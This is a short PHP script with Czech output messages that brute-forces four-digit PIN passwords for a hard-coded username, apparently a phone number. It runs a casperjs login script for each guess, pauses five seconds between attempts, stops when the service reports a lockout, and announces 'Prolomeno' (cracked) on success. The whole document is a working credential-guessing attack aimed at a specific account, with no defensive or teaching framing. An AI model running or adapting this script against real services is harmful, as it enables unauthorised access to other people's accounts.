<?php
ini_set('max_execution_time', '86400');

$passwords = range(5205, 5215);
foreach($passwords as $password) {
  $password = str_pad($password, 4, '0', STR_PAD_LEFT);

  $cmd = 'casperjs index.js --username=721090491 --password='.$password;
  echo 'Zkousim heslo '.$password.PHP_EOL;

  $time_pre = microtime(true);
  $exec = shell_exec($cmd).PHP_EOL;
  list($number, $msg) = explode("\n", $exec);
  $time_post = microtime(true);
  $exec_time = $time_post - $time_pre;

  echo $exec.PHP_EOL;
  echo 'Pozadavek trval '.round($exec_time, 2).' s'.PHP_EOL;

  if (mb_substr($msg, 0, 11) == 'Je nám líto') {
    echo 'Zablokovano, exit'.PHP_EOL;
    exit;
  }
  if ($number != 'null') {
    echo 'Prolomeno, heslo '. $password .', exit'.PHP_EOL;
    exit;
  }
  sleep(5);
}
